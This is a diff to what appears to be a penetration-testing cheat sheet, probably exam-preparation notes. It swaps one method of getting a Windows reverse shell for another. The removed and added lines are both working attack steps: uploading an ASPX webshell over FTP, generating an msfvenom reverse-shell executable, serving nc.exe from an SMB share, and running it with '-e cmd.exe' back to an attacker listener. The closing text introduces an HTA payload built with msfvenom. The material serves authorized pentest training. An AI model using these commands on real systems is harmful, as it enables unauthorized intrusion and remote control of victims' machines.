@@ -220,12 +220,13 @@ cmd /c C:\\Windows\\temp\\shell.exe
 C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
 ````
 ````
-wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
-ftp> put cmd.aspx
-http://<IP:<port>/cmd.aspx
-msfvenom -p windows/shell_reverse_tcp LHOST=<your kali $IP> LPORT=<local port> -f exe -o shell.exe
-ftp> put shell.exe
-nc -nlvp <port from shell.exe>
+cp /usr/share/webshells/aspx/cmdasp.aspx .
+cp /usr/share/windows-binaries/nc.exe .
+ftp> put cmdasp.aspx
+smbserver.py -smb2support Share .
+http://<target $IP>:<port>/cmdasp.aspx
+nc -nlvp <port on your kali>
+cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
 ````
 ### HTA Attack in Action
 We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
